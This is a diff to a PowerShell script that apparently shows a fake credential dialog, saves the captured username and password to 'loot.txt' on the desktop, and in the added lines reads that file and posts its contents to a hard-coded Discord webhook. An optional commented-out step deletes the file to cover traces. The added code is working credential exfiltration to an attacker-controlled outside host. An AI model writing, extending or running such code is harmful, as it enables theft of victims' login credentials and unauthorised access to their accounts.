@@ -108,3 +108,15 @@ $window.ShowDialog()
 # Save credentials to a text file on the desktop named loot.txt
 "Username: $global:username `r`nPassword: $global:password" | Out-File "$env:USERPROFILE\Desktop\loot.txt"
 
+# Send the credentials to Discord webhook
+$webhookUrl = 'https://discord.com/api/webhooks/1153646407476051978/SrG-zO85AIbihBzLpQhCkoz9rSQPSwWJnc-FHNqqYK2wC0hcEfs8txmwWMTlkROZBwGK'
+$data = Get-Content -Path "$env:USERPROFILE\Desktop\loot.txt"
+
+$bodyContent = @{
+    'content' = $data.Substring(0, [Math]::Min(1999, $data.Length))
+} | ConvertTo-Json
+
+Invoke-RestMethod -Uri $webhookUrl -Method POST -Body $bodyContent -ContentType 'application/json'
+
+# Optionally, you can delete loot.txt after sending to Discord if you wish for cleaner operation
+# Remove-Item "$env:USERPROFILE\Desktop\loot.txt"
